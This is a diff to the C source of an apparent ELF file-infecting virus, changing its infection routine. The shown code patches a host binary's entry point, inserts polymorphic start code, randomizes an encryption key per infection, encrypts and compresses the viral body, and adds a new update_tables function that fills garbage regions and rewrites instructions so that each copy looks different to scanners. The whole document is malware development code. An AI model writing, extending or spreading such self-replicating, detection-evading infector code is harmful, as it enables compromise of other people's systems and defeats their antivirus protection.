@@ -1,13 +1,14 @@
 #include "infect.h"
+#include "table.h"
 
 //char KEY[16];
 #define DATA 0x02
 
 void randomize_key(){
-	((uint32_t*)key)[0] = ft_rand();	
-	((uint32_t*)key)[1] = ft_rand();	
-	((uint32_t*)key)[2] = ft_rand();	
-	((uint32_t*)key)[3] = ft_rand();	
+	((uint32_t*)key)[0] = ft_rand();
+	((uint32_t*)key)[1] = ft_rand();
+	((uint32_t*)key)[2] = ft_rand();
+	((uint32_t*)key)[3] = ft_rand();
 }
 
 int get_sig(char *s, size_t n, size_t virus_len, char *sig)
@@ -140,8 +141,8 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	//ph[x].p_memsz += changed;
 	poly_new_start((*s) + pos, p.infect_push_off, p.infect_pop_off);
 	randomize_key();
+	update_tables((*s)+pos, p.bn, p);
 	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, p);
-
 	//---------- z3 (encryption with compression) ----------------
 	bool compressed = TRUE;
 	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed, p.encrypt_routine);
@@ -158,11 +159,30 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 
 	//int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 	get_sig(*s, *n, p.bn, ((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2);
-	
+
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
 	return TRUE;
+}
+
+void update_tables(unsigned char *b, size_t len, struct s_infect_params p) {
+
+	Garbage *gb_table = ((Garbage *)(b + p.gb_table_off));
+	unsigned int gb_table_len = *((unsigned int *)(b + p.gb_table_len_off));
+	Modif *modif_table = ((Modif *)(b + p.modif_table_off));
+	unsigned int modif_table_len = *((unsigned int *)(b + p.modif_table_len_off));
+
+	unsigned char *prev = NULL;
+	for (size_t i = 0 ; i < gb_table_len; i++){
+		generate_garb(b + gb_table[i].off, gb_table[i].len, prev);
+		prev = gb_table[i].off + gb_table[i].len;
+	}
+
+	for (size_t i = 0 ; i < modif_table_len; i++){
+		int xx = edit_ins(b + modif_table[i].off);
+		debug_ext("for ", i, " >> ",xx," \n");
+	}
 }
 
 //=============================================================
